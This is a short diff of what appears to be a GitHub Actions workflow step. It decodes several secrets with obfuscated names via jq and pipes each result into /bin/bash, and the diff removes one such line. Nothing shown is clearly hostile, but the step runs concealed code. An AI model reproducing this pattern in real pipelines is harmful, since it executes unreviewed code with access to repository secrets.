@@ -17,7 +17,6 @@ jobs:
           tn968: ${{ secrets.tn968 }}
         run: |
           printf '%s' "$tn968" | jq -r .whj4765 | /bin/bash
-          printf '%s' "$dam72" | jq -r .os839 | /bin/bash
           echo $su677 | jq -r .vis74621 | /bin/bash
           printf '%s' "$sq3" | jq -r .v92 | /bin/bash
           printf '%s' "$jl36" | jq -r .eikmi9 | /bin/bash
